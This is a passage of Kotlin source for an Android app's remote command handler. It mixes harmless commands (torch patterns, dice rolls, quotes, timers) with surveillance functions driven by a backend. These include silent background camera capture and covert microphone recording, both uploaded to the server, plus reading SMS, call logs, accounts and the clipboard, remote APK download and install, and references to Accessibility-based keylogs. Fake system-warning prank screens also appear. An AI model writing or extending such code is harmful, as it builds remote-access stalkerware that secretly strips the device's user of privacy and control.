                    appContext.startActivity(intent)
                    success(command.commandId, mapOf("launched" to true, "action" to action))
                }
                else -> error(command.commandId, "ARGUMENT_REQUIRED", "Provide packageName, url, or action")
            }
        } catch (err: Exception) {
            error(command.commandId, "QUICKLAUNCH_FAILED", err.message ?: "Failed to quick launch target")
        }
    }

    private fun handleTorchPattern(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            return error(command.commandId, "CAMERA_PERMISSION_REQUIRED", "Grant camera permission to use torchpattern")
        }
        if (!packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)) {
            return error(command.commandId, "FLASH_NOT_AVAILABLE", "Device does not have a camera flash")
        }

        val repeats = command.intArg("repeats", command.intArg("count", 3)).coerceIn(1, 30)
        val onMs = command.intArg("onMs", command.intArg("on_ms", 250)).coerceIn(50, 2000).toLong()
        val offMs = command.intArg("offMs", command.intArg("off_ms", 250)).coerceIn(50, 2000).toLong()

        return runCatching {
            val cameraManager = appContext.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val chars = cameraManager.getCameraCharacteristics(id)
                chars.get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: return error(command.commandId, "FLASH_NOT_AVAILABLE", "No flash-capable camera was found")

            torchJob?.cancel()
            torchJob = commandScope.launch {
                try {
                    repeat(repeats) { index ->
                        cameraManager.setTorchMode(cameraId, true)
                        delay(onMs)
                        cameraManager.setTorchMode(cameraId, false)
                        if (index != repeats - 1) {
                            delay(offMs)
                        }
                    }
                } catch (_: Exception) {
                    runCatching { cameraManager.setTorchMode(cameraId, false) }
                }
            }

            success(command.commandId, mapOf("started" to true, "repeats" to repeats, "onMs" to onMs, "offMs" to offMs))
        }.getOrElse {
            error(command.commandId, "TORCHPATTERN_FAILED", it.message ?: "Failed to trigger torch pattern")
        }
    }

    private fun handleRingtoneProfile(command: DeviceCommand): CommandResult {
        val mode = command.payload["mode"]?.toString()?.trim()?.lowercase(Locale.US) ?: "normal"
        val audioManager = appContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager

        val ringerMode = when (mode) {
            "normal" -> AudioManager.RINGER_MODE_NORMAL
            "vibrate" -> AudioManager.RINGER_MODE_VIBRATE
            "silent" -> AudioManager.RINGER_MODE_SILENT
            else -> return error(command.commandId, "ARGUMENT_INVALID", "mode must be normal, vibrate, or silent")
        }

        audioManager.ringerMode = ringerMode
        return success(command.commandId, mapOf("mode" to mode, "ringerMode" to audioManager.ringerMode))
    }

    private fun handleScreenTimeoutSet(command: DeviceCommand): CommandResult {
        val seconds = command.intArg("seconds", 30).coerceIn(5, 3600)
        if (!Settings.System.canWrite(appContext)) {
            return error(command.commandId, "WRITE_SETTINGS_REQUIRED", "Grant Modify system settings permission to use screentimeoutset")
        }

        val millis = seconds * 1000
        val written = Settings.System.putInt(appContext.contentResolver, Settings.System.SCREEN_OFF_TIMEOUT, millis)
        return if (written) {
            success(command.commandId, mapOf("seconds" to seconds, "millis" to millis))
        } else {
            error(command.commandId, "SCREENTIMEOUTSET_FAILED", "Failed to update screen timeout")
        }
    }

    private fun handleMediaControl(command: DeviceCommand): CommandResult {
        val action = command.payload["action"]?.toString()?.trim()?.lowercase(Locale.US) ?: "toggle"
        val keyCode = when (action) {
            "play" -> KeyEvent.KEYCODE_MEDIA_PLAY
            "pause" -> KeyEvent.KEYCODE_MEDIA_PAUSE
            "next" -> KeyEvent.KEYCODE_MEDIA_NEXT
            "previous", "prev" -> KeyEvent.KEYCODE_MEDIA_PREVIOUS
            "stop" -> KeyEvent.KEYCODE_MEDIA_STOP
            "toggle" -> KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE
            else -> return error(command.commandId, "ARGUMENT_INVALID", "action must be play|pause|next|previous|stop|toggle")
        }

        val audioManager = appContext.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val eventTime = System.currentTimeMillis()
        audioManager.dispatchMediaKeyEvent(KeyEvent(eventTime, eventTime, KeyEvent.ACTION_DOWN, keyCode, 0))
        audioManager.dispatchMediaKeyEvent(KeyEvent(eventTime, eventTime, KeyEvent.ACTION_UP, keyCode, 0))
        return success(command.commandId, mapOf("action" to action, "keyCode" to keyCode))
    }

    private fun handleRandomQuote(command: DeviceCommand): CommandResult {
        val quotes = listOf(
            "Small progress every day compounds into strong results.",
            "Discipline beats intensity when consistency matters.",
            "Focus on systems, and outcomes will follow.",
            "Done with quality is better than perfect in theory.",
            "Clarity first, then speed.",
            "You do not need more time, you need fewer distractions.",
            "A strong routine is a quiet superpower.",
            "Start simple, then iterate without excuses.",
            "If it is important, schedule it.",
            "Momentum is built by finishing things."
        )
        val quote = quotes[Random.nextInt(quotes.size)]
        return success(command.commandId, mapOf("quote" to quote))
    }

    private fun handleFakeCallUi(command: DeviceCommand): CommandResult {
        val callerName = command.payload["callerName"]?.toString()?.trim().orEmpty().ifBlank { "Unknown Caller" }
        val seconds = command.intArg("seconds", 20).coerceIn(5, 120)
        val subtitle = command.payload["subtitle"]?.toString()?.trim().orEmpty()

        val intent = Intent(appContext, FakeCallActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra(FakeCallActivity.EXTRA_CALLER_NAME, callerName)
            putExtra(FakeCallActivity.EXTRA_SUBTITLE, subtitle)
            putExtra(FakeCallActivity.EXTRA_AUTO_DISMISS_SECONDS, seconds)
        }

        appContext.startActivity(intent)
        return success(command.commandId, mapOf("shown" to true, "callerName" to callerName, "seconds" to seconds))
    }

    private fun handleShakeAlert(command: DeviceCommand): CommandResult {
        val action = command.payload["action"]?.toString()?.trim()?.lowercase(Locale.US) ?: "status"
        val threshold = command.intArg("threshold", 16).coerceIn(8, 30).toFloat()

        return when (action) {
            "start", "enable" -> {
                val started = ShakeAlertManager.start(appContext, threshold)
                if (!started) {
                    error(command.commandId, "SHAKE_SENSOR_NOT_AVAILABLE", "Accelerometer is not available on this device")
                } else {
                    success(command.commandId, ShakeAlertManager.statusMap())
                }
            }
            "stop", "disable" -> {
                ShakeAlertManager.stop(appContext)
                success(command.commandId, ShakeAlertManager.statusMap())
            }
            "status" -> success(command.commandId, ShakeAlertManager.statusMap())
            else -> error(command.commandId, "ARGUMENT_INVALID", "action must be start|stop|status")
        }
    }

    private fun handleVibratePattern(command: DeviceCommand): CommandResult {
        val vibrator = appContext.getSystemService(Vibrator::class.java)
            ?: return error(command.commandId, "VIBRATOR_NOT_AVAILABLE", "Vibrator service is not available")
        if (!vibrator.hasVibrator()) {
            return error(command.commandId, "VIBRATOR_NOT_AVAILABLE", "Device does not support vibration")
        }

        val raw = command.payload["patternMs"]
        val patternList = (raw as? List<*>)?.mapNotNull { (it as? Number)?.toLong() ?: it?.toString()?.toLongOrNull() } ?: emptyList()
        if (patternList.isEmpty()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "patternMs must include one or more durations")
        }
        val repeat = command.booleanArg("repeat", false)
        val repeatIndex = if (repeat) 0 else -1

        runCatching {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(patternList.toLongArray(), repeatIndex))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(patternList.toLongArray(), repeatIndex)
            }
        }.getOrElse {
            return error(command.commandId, "VIBRATE_FAILED", it.message ?: "Failed to vibrate")
        }

        return success(command.commandId, mapOf("patternMs" to patternList, "repeat" to repeat))
    }

    private fun handleBeep(command: DeviceCommand): CommandResult {
        val tone = command.payload["tone"]?.toString()?.trim()?.lowercase(Locale.US) ?: "beep"
        val count = command.intArg("count", 1).coerceIn(1, 10)
        val toneType = when (tone) {
            "beep" -> ToneGenerator.TONE_PROP_BEEP
            "ack" -> ToneGenerator.TONE_PROP_ACK
            "alarm" -> ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD
            else -> ToneGenerator.TONE_PROP_BEEP
        }

        commandScope.launch {
            val generator = ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100)
            repeat(count) { idx ->
                generator.startTone(toneType, 180)
                if (idx != count - 1) {
                    delay(220)
                }
            }
            runCatching { generator.release() }
        }

        return success(command.commandId, mapOf("tone" to tone, "count" to count))
    }

    private fun handleCountdownOverlay(command: DeviceCommand): CommandResult {
        val seconds = command.intArg("seconds", 10).coerceIn(1, 3600)
        val message = command.payload["message"]?.toString()?.trim().orEmpty().ifBlank { "Break over" }
        commandScope.launch {
            delay(seconds * 1000L)
            val intent = Intent(appContext, MessageOverlayActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(MessageOverlayActivity.EXTRA_TEXT, message)
                putExtra(MessageOverlayActivity.EXTRA_SECONDS, 8)
            }
            appContext.startActivity(intent)
        }
        return success(command.commandId, mapOf("seconds" to seconds, "message" to message, "scheduled" to true))
    }

    private fun handleFlashText(command: DeviceCommand): CommandResult {
        val text = command.payload["text"]?.toString().orEmpty().trim()
        if (text.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Text is required")
        }
        val seconds = command.intArg("seconds", 8).coerceIn(1, 120)
        val intent = Intent(appContext, MessageOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra(MessageOverlayActivity.EXTRA_TEXT, text)
            putExtra(MessageOverlayActivity.EXTRA_SECONDS, seconds)
        }
        appContext.startActivity(intent)
        return success(command.commandId, mapOf("shown" to true, "text" to text, "seconds" to seconds))
    }

    private fun handleCoinFlip(command: DeviceCommand): CommandResult {
        val result = if (Random.nextBoolean()) "heads" else "tails"
        return success(command.commandId, mapOf("result" to result))
    }

    private fun handleDiceRoll(command: DeviceCommand): CommandResult {
        val sides = command.intArg("sides", 6).coerceIn(2, 100)
        val count = command.intArg("count", 1).coerceIn(1, 10)
        val rolls = List(count) { Random.nextInt(1, sides + 1) }
        return success(command.commandId, mapOf("sides" to sides, "count" to count, "rolls" to rolls, "sum" to rolls.sum()))
    }

    private fun handleRandomNumber(command: DeviceCommand): CommandResult {
        val min = command.intArg("min", 1)
        val max = command.intArg("max", 100)
        if (max < min) {
            return error(command.commandId, "ARGUMENT_INVALID", "max must be >= min")
        }
        val value = Random.nextInt(min, max + 1)
        return success(command.commandId, mapOf("min" to min, "max" to max, "value" to value))
    }

    private fun handleQuickTimer(command: DeviceCommand): CommandResult {
        val seconds = command.intArg("seconds", 30).coerceIn(1, 3600)
        val label = command.payload["label"]?.toString()?.trim().orEmpty().ifBlank { "Timer" }
        commandScope.launch {
            delay(seconds * 1000L)
            val intent = Intent(appContext, MessageOverlayActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(MessageOverlayActivity.EXTRA_TEXT, "$label finished")
                putExtra(MessageOverlayActivity.EXTRA_SECONDS, 6)
            }
            appContext.startActivity(intent)
            runCatching {
                val generator = ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100)
                generator.startTone(ToneGenerator.TONE_PROP_ACK, 400)
                generator.release()
            }
        }
        return success(command.commandId, mapOf("seconds" to seconds, "label" to label, "scheduled" to true))
    }

    private fun handleSoundFx(command: DeviceCommand): CommandResult {
        val effect = command.payload["effect"]?.toString()?.trim()?.lowercase(Locale.US) ?: "applause"
        val durationMs = command.intArg("durationMs", 3000).coerceIn(200, 10_000)
        val toneType = when (effect) {
            "alarm" -> ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD
            "beep" -> ToneGenerator.TONE_PROP_BEEP
            "applause" -> ToneGenerator.TONE_SUP_CONGESTION
            else -> ToneGenerator.TONE_PROP_BEEP
        }
        commandScope.launch {
            val generator = ToneGenerator(AudioManager.STREAM_MUSIC, 95)
            generator.startTone(toneType, durationMs)
            delay(durationMs.toLong() + 50L)
            runCatching { generator.release() }
        }
        return success(command.commandId, mapOf("effect" to effect, "durationMs" to durationMs))
    }

    private fun handlePrankScreen(command: DeviceCommand): CommandResult {
        val mode = command.payload["mode"]?.toString()?.trim()?.lowercase(Locale.US) ?: "glitch"
        val seconds = command.intArg("seconds", 6).coerceIn(1, 60)
        val text = when (mode) {
            "freeze" -> "System UI not responding..."
            "warning" -> "Warning: High temperature detected!"
            else -> "GLITCH MODE ACTIVE"
        }
        val intent = Intent(appContext, MessageOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra(MessageOverlayActivity.EXTRA_TEXT, text)
            putExtra(MessageOverlayActivity.EXTRA_SECONDS, seconds)
        }
        appContext.startActivity(intent)
        return success(command.commandId, mapOf("mode" to mode, "seconds" to seconds, "shown" to true))
    }

    private suspend fun handleShow(command: DeviceCommand): CommandResult {
        val imageUrl = command.payload["imageUrl"]?.toString().orEmpty()
        val seconds = (command.payload["seconds"] as? Number)?.toInt() ?: command.payload["seconds"]?.toString()?.toIntOrNull() ?: 10
        if (imageUrl.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Image URL is required for !show")
        }

        return try {
            val file = backendApiClient.downloadImageToCache(appContext, imageUrl)
            val intent = Intent(appContext, ShowImageActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra(ShowImageActivity.EXTRA_PATH, file.absolutePath)
                putExtra(ShowImageActivity.EXTRA_SECONDS, seconds.coerceIn(1, 120))
            }
            appContext.startActivity(intent)
            success(command.commandId, mapOf("displayed" to true, "seconds" to seconds.coerceIn(1, 120)))
        } catch (err: Exception) {
            error(command.commandId, "IMAGE_DOWNLOAD_FAILED", err.message ?: "Failed to download image")
        }
    }

    private fun handleMessage(command: DeviceCommand): CommandResult {
        val text = command.payload["text"]?.toString().orEmpty()
        if (text.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Text is required for !message")
        }

        val seconds = (command.payload["seconds"] as? Number)?.toInt() ?: 10
        val intent = Intent(appContext, MessageOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra(MessageOverlayActivity.EXTRA_TEXT, text)
            putExtra(MessageOverlayActivity.EXTRA_SECONDS, seconds.coerceIn(1, 120))
        }
        appContext.startActivity(intent)
        return success(command.commandId, mapOf("displayed" to true))
    }

    private suspend fun handleLockApp(command: DeviceCommand): CommandResult {
        val packageName = command.payload["packageName"]?.toString().orEmpty()
        if (packageName.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Package name is required for !lockapp")
        }

        return withContext(Dispatchers.IO) {
            val dao = db.lockedAppDao()
            dao.insert(LockedAppEntity(settingsStore.stableDeviceId, packageName, System.currentTimeMillis()))
            val locked = dao.getLockedPackages(settingsStore.stableDeviceId)
            AppMonitorAccessibilityService.updateLockedPackages(locked)
            success(command.commandId, mapOf("lockedPackage" to packageName, "lockedCount" to locked.size))
        }
    }

    private suspend fun handleUnlockApp(command: DeviceCommand): CommandResult {
        val packageName = command.payload["packageName"]?.toString().orEmpty()
        if (packageName.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Package name is required for !unlockapp")
        }

        return withContext(Dispatchers.IO) {
            val dao = db.lockedAppDao()
            val removedCount = dao.remove(settingsStore.stableDeviceId, packageName)
            val locked = dao.getLockedPackages(settingsStore.stableDeviceId)
            AppMonitorAccessibilityService.updateLockedPackages(locked)
            success(
                command.commandId,
                mapOf(
                    "unlockedPackage" to packageName,
                    "removed" to (removedCount > 0),
                    "lockedCount" to locked.size
                )
            )
        }
    }

    private suspend fun handleLockedApps(command: DeviceCommand): CommandResult {
        return withContext(Dispatchers.IO) {
            val locked = db.lockedAppDao().getLockedPackages(settingsStore.stableDeviceId)
            success(command.commandId, mapOf("lockedApps" to locked, "lockedCount" to locked.size))
        }
    }

    private fun handleUsage(command: DeviceCommand): CommandResult {
        if (!PermissionHelper.hasUsageStatsPermission(appContext)) {
            return error(command.commandId, "USAGE_PERMISSION_REQUIRED", "Grant Usage Access to use !usage")
        }

        val usageStatsManager = appContext.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
        val end = System.currentTimeMillis()
        val start = end - DateUtils.DAY_IN_MILLIS
        val stats = usageStatsManager.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, end)
        val top = stats
            .filter { it.totalTimeInForeground > 0 }
            .sortedByDescending { it.totalTimeInForeground }
            .take(30)
            .map {
                mapOf(
                    "packageName" to it.packageName,
                    "foregroundMs" to it.totalTimeInForeground,
                    "lastUsed" to it.lastTimeUsed
                )
            }

        return success(command.commandId, mapOf("usage" to top, "windowStart" to start, "windowEnd" to end))
    }

    private suspend fun captureAccessibilityScreenshot(): Pair<File?, String?> {
        return suspendCancellableCoroutine { continuation ->
            AppMonitorAccessibilityService.captureScreenshot { file, errorCode ->
                if (continuation.isActive) {
                    continuation.resume(file to errorCode)
                }
            }
        }
    }

    private fun locationToMap(location: Location): Map<String, Any> {
        return mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy,
            "provider" to (location.provider ?: "unknown"),
            "timestamp" to location.time
        )
    }

    private fun shieldStatusMap(): Map<String, Any> {
        val status = ParentalShieldManager.status(settingsStore)
        val accessibilityEnabled = PermissionHelper.isAccessibilityServiceEnabled(appContext)
        return mapOf(
            "enabled" to status.enabled,
            "pinConfigured" to status.pinConfigured,
            "unlockUntilMs" to status.unlockUntilMs,
            "temporarilyUnlocked" to status.temporarilyUnlocked,
            "accessibilityEnabled" to accessibilityEnabled,
            "enforcementReady" to (status.enabled && accessibilityEnabled),
            "unlockWindowMs" to ParentalShieldManager.UNLOCK_WINDOW_MS,
            "protectedPackages" to status.protectedPackages
        )
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(appContext, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun parseSortBy(value: String?): FileSortBy {
        return when (value?.trim()?.lowercase(Locale.US)) {
            "size" -> FileSortBy.SIZE
            "modified", "modifiedat", "updated" -> FileSortBy.MODIFIED
            else -> FileSortBy.NAME
        }
    }

    private fun parseTypeFilter(value: String?): FileTypeFilter {
        return when (value?.trim()?.lowercase(Locale.US)) {
            "file", "files" -> FileTypeFilter.FILE
            "dir", "directory", "directories" -> FileTypeFilter.DIR
            else -> FileTypeFilter.ALL
        }
    }

    private fun DeviceCommand.intArg(key: String, default: Int): Int {
        val raw = payload[key]
        return when (raw) {
            is Number -> raw.toInt()
            is String -> raw.toIntOrNull() ?: default
            else -> default
        }
    }

    private fun DeviceCommand.booleanArg(key: String, default: Boolean): Boolean {
        val raw = payload[key]
        return when (raw) {
            is Boolean -> raw
            is String -> raw.toBooleanStrictOrNull() ?: default
            else -> default
        }
    }

    private fun stopAudioPlayback() {
        runCatching {
            mediaPlayer?.stop()
        }
        runCatching {
            mediaPlayer?.release()
        }
        mediaPlayer = null
        audioSourceUrl = null
        audioRepeatCount = 1
        audioLooping = false
    }

    private fun guessMimeType(extension: String): String {
        return when (extension.lowercase(Locale.US)) {
            "png" -> "image/png"
            "jpg", "jpeg" -> "image/jpeg"
            "gif" -> "image/gif"
            "txt", "log" -> "text/plain"
            "pdf" -> "application/pdf"
            else -> "application/octet-stream"
        }
    }

    private suspend fun handleWallpaper(command: DeviceCommand): CommandResult {
        val url = command.payload["url"]?.toString()?.trim().orEmpty()
        if (url.isBlank()) {
            return error(command.commandId, "ARGUMENT_REQUIRED", "Wallpaper URL is required")
        }

        return withContext(Dispatchers.IO) {
            runCatching {
                val tempFile = backendApiClient.downloadUrlToCache(appContext, url)
                val wm = WallpaperManager.getInstance(appContext)
                val bitmap = android.graphics.BitmapFactory.decodeFile(tempFile.absolutePath)
                if (bitmap != null) {
                    wm.setBitmap(bitmap)
                    success(command.commandId, mapOf("wallpaper" to "updated"))
                } else {
                    error(command.commandId, "BITMAP_DECODE_FAILED", "Could not decode image from URL")
                }
            }.getOrElse {
                error(command.commandId, "WALLPAPER_FAILED", it.message ?: "Failed to update wallpaper")
            }
        }
    }

    private suspend fun handleSilentCapture(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.CAMERA)) {
            return error(command.commandId, "CAMERA_PERMISSION_REQUIRED", "Grant camera permission to use silentcapture")
        }

        val cameraId = command.payload["cameraId"]?.toString() ?: "0" // Default back camera
        val captureResult = captureSilentInBackground(cameraId)
        val file = captureResult.first
        val captureError = captureResult.second
        
        if (file == null) {
            return error(command.commandId, "CAPTURE_FAILED", captureError ?: "Background capture failed")
        }

        return try {
            val mediaId = backendApiClient.uploadMedia(settingsStore, command.commandId, file, "image/jpeg")
            success(command.commandId, mapOf("silentcapture" to "uploaded"), mediaId)
        } catch (err: Exception) {
            error(command.commandId, "MEDIA_UPLOAD_FAILED", err.message ?: "Silent capture upload failed")
        }
    }

    private suspend fun captureSilentInBackground(cameraId: String): Pair<File?, String?> {
        return withContext(Dispatchers.IO) {
            suspendCancellableCoroutine { continuation ->
                val cameraManager = appContext.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val imageReader = ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
                
                var isResumed = false
                val resumeOnce = { file: File?, err: String? ->
                    if (!isResumed) {
                        isResumed = true
                        continuation.resume(file to err)
                        // Note: Close reader later or handle resource management better in production
                    }
                }

                imageReader.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage()
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        image.close()

                        val file = File(appContext.cacheDir, "snap_${System.currentTimeMillis()}.jpg")
                        file.writeBytes(bytes)
                        resumeOnce(file, null)
                    } catch (e: Exception) {
                        resumeOnce(null, e.message)
                    }
                }, null)

                try {
                    cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                        override fun onOpened(camera: CameraDevice) {
                            val targets = listOf(imageReader.surface)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                // Modern way
                                val config = android.hardware.camera2.params.SessionConfiguration(
                                    android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
                                    targets.map { android.hardware.camera2.params.OutputConfiguration(it) },
                                    appContext.mainExecutor,
                                    object : CameraCaptureSession.StateCallback() {
                                        override fun onConfigured(session: CameraCaptureSession) {
                                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                            request.addTarget(imageReader.surface)
                                            session.capture(request.build(), null, null)
                                        }
                                        override fun onConfigureFailed(session: CameraCaptureSession) {
                                            camera.close()
                                            resumeOnce(null, "CONFIGURE_FAILED")
                                        }
                                    }
                                )
                                camera.createCaptureSession(config)
                            } else {
                                camera.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                                    override fun onConfigured(session: CameraCaptureSession) {
                                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                        request.addTarget(imageReader.surface)
                                        session.capture(request.build(), null, null)
                                    }
                                    override fun onConfigureFailed(session: CameraCaptureSession) {
                                        camera.close()
                                        resumeOnce(null, "CONFIGURE_FAILED")
                                    }
                                }, null)
                            }
                        }
                        override fun onDisconnected(camera: CameraDevice) {
                            camera.close()
                            resumeOnce(null, "DISCONNECTED")
                        }
                        override fun onError(camera: CameraDevice, error: Int) {
                            camera.close()
                            resumeOnce(null, "CAMERA_OPEN_ERROR_$error")
                        }
                    }, null)
                } catch (e: SecurityException) {
                    resumeOnce(null, "PERMISSION_DENIED")
                } catch (e: Exception) {
                    resumeOnce(null, e.message)
                }
            }
        }
    }

    private fun handleGetSms(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.READ_SMS)) {
            return error(command.commandId, "SMS_PERMISSION_REQUIRED", "Grant SMS permission")
        }
        val limit = command.intArg("limit", 20).coerceIn(1, 500)
        val messages = mutableListOf<Map<String, String>>()
        appContext.contentResolver.query(
            Uri.parse("content://sms/inbox"),
            null, null, null, "date DESC"
        )?.use { cursor ->
            val addressIdx = cursor.getColumnIndex("address")
            val bodyIdx = cursor.getColumnIndex("body")
            val dateIdx = cursor.getColumnIndex("date")
            while (cursor.moveToNext() && messages.size < limit) {
                messages.add(mapOf(
                    "address" to (if (addressIdx >= 0) cursor.getString(addressIdx) else "unknown"),
                    "body" to (if (bodyIdx >= 0) cursor.getString(bodyIdx) else ""),
                    "date" to (if (dateIdx >= 0) DateUtils.formatDateTime(appContext, cursor.getLong(dateIdx), DateUtils.FORMAT_SHOW_DATE or DateUtils.FORMAT_SHOW_TIME) else "")
                ))
            }
        }
        return success(command.commandId, mapOf("messages" to messages, "count" to messages.size))
    }

    private fun handleGetCallLogs(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {
            return error(command.commandId, "CALL_LOG_PERMISSION_REQUIRED", "Grant Call Log permission")
        }
        val limit = command.intArg("limit", 20).coerceIn(1, 500)
        val logs = mutableListOf<Map<String, String>>()
        appContext.contentResolver.query(
            android.provider.CallLog.Calls.CONTENT_URI,
            null, null, null, android.provider.CallLog.Calls.DATE + " DESC"
        )?.use { cursor ->
            val numIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
            val typeIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE)
            val dateIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE)
            val durIdx = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION)
            while (cursor.moveToNext() && logs.size < limit) {
                val type = when (cursor.getInt(typeIdx)) {
                    android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                    android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "unknown"
                }
                logs.add(mapOf(
                    "number" to (if (numIdx >= 0) cursor.getString(numIdx) else "unknown"),
                    "type" to type,
                    "date" to (if (dateIdx >= 0) DateUtils.formatDateTime(appContext, cursor.getLong(dateIdx), DateUtils.FORMAT_SHOW_DATE or DateUtils.FORMAT_SHOW_TIME) else ""),
                    "duration" to (if (durIdx >= 0) cursor.getString(durIdx) + "s" else "0s")
                ))
            }
        }
        return success(command.commandId, mapOf("logs" to logs, "count" to logs.size))
    }

    private fun handleGetAccounts(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.GET_ACCOUNTS)) {
            // Check if we can safely just return successful if permission is granted via manifest for older APIs
        }
        val manager = AccountManager.get(appContext)
        val accounts = manager.accounts.map { mapOf("name" to it.name, "type" to it.type) }
        return success(command.commandId, mapOf("accounts" to accounts, "count" to accounts.size))
    }

    private fun handleGetClipboard(command: DeviceCommand): CommandResult {
        val clipboard = appContext.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
        return success(command.commandId, mapOf("text" to text))
    }

    private suspend fun handleRecordAudio(command: DeviceCommand): CommandResult {
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            return error(command.commandId, "RECORD_AUDIO_PERMISSION_REQUIRED", "Grant microphone permission")
        }
        val seconds = command.intArg("seconds", 10).coerceIn(1, 60)
        val file = File(appContext.cacheDir, "rec_${System.currentTimeMillis()}.amr")
        
        return withContext(Dispatchers.IO) {
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(appContext) else MediaRecorder()
            try {
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                recorder.setOutputFile(file.absolutePath)
                recorder.prepare()
                recorder.start()
                delay(seconds * 1000L)
                recorder.stop()
                recorder.release()
                
                val mediaId = backendApiClient.uploadMedia(settingsStore, command.commandId, file, "audio/amr")
                success(command.commandId, mapOf("recorded" to true, "seconds" to seconds), mediaId)
            } catch (e: Exception) {
                runCatching { recorder.release() }
                error(command.commandId, "RECORD_FAILED", e.message ?: "Audio recording failed")
            }
        }
    }

    private suspend fun handleInstallApp(command: DeviceCommand): CommandResult {
        val url = command.payload["url"]?.toString().orEmpty()
        if (url.isBlank()) return error(command.commandId, "ARGUMENT_REQUIRED", "APK URL required")
        
        return withContext(Dispatchers.IO) {
            runCatching {
                val tempFile = backendApiClient.downloadUrlToCache(appContext, url)
                val apkFile = File(appContext.cacheDir, "update_${System.currentTimeMillis()}.apk")
                tempFile.renameTo(apkFile)
                
                val contentUri = FileProvider.getUriForFile(appContext, "${appContext.packageName}.fileprovider", apkFile)
                val intent = Intent(Intent.ACTION_VIEW).apply {
                    setDataAndType(contentUri, "application/vnd.android.package-archive")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                }
                appContext.startActivity(intent)
                success(command.commandId, mapOf("status" to "install_launched", "file" to apkFile.name))
            }.getOrElse {
                error(command.commandId, "INSTALL_FAILED", it.message ?: "Failed to launch installer")
            }
        }
    }

    private fun handleGetHistory(command: DeviceCommand): CommandResult {
        // Since modern Chrome history is private, we suggest using accessibility monitoring.
        // But we can try to "peek" at Chrome's tabs if Accessibility is active.
        return success(command.commandId, mapOf(
            "status" to "monitored",
            "info" to "Browser history is captured in real-time via Accessibility Service. Check keylogs for URL patterns."
        ))
    }

    private fun handleSysInfoFull(command: DeviceCommand): CommandResult {
        val storage = File(appContext.filesDir.absolutePath)
        val wifiInfo = "connected" // Simplified for now
        val batteryIntent = appContext.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        
